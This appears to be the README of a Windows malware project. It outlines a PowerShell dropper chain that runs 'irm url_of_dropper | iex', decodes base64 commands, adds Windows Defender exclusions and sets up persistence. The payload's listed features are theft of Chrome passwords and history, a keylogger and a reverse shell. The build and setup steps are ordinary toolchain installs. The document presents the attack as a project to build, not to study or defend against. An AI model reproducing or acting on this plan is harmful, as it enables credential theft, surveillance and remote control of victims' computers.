# PS Dropper and Malware Execution Steps

### Step 1
1. User somehow executes the init_file.exe in admin mode.
1. File sets Execution Policy to Unrestricted     
1. File executes "irm url_of_dropper" | iex

### Step 2

1. The downloaded ps1 file (via the iex pipe) will then be executed. 
1. The file will contain base64 encoded powershell commands which the non encoded portion of the dropper will decode and execute
1. The decoded commands will first add filename exclusions to the windows defender exclusion list
1. It will then download the acutal malware.
1. To enable persistence, either windows services will be created or malware will be placed in the startup folder (tbd)

### Step 3
1. Malware will then be executed
1. Malware Features List
   * Chrome history and passwords exfiltration
   * Keylogger and exfiltration
   * Reversh shell via POST request


### Installation Instructions
- Install make on windows by running the following command
  - Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'));choco install make 
- Install MSYS installer from
  - https://github.com/msys2/msys2-installer/releases/download/2022-12-16/msys2-x86_64-20221216.exe
- From MSYS, run the following commands
  -  pacman -Syu 
  -  pacman -Su
  -  pacman -S mingw-w64-x86_64-gcc
  -  pacman -S mingw-w64-x86_64-rapidjson
  -  pacman -S mingw-w64-x86_64-curl
  -  pacman -S mingw-w64-x86_64-openssl
  -  pacman -S mingw-w64-x86_64-sqlite3
  -  pacman -S mingw-w64-x86_64-jsoncpp
- Add the "C:\msys64\mingw64\bin" to the PATH environment variable
- Install python for windows
  - pip3 install termcolor    
- To generate all source files, run "make all" from an elevated prompt
- To start the server, first ensure that nodejs for windows has been installed and run node server/index.js

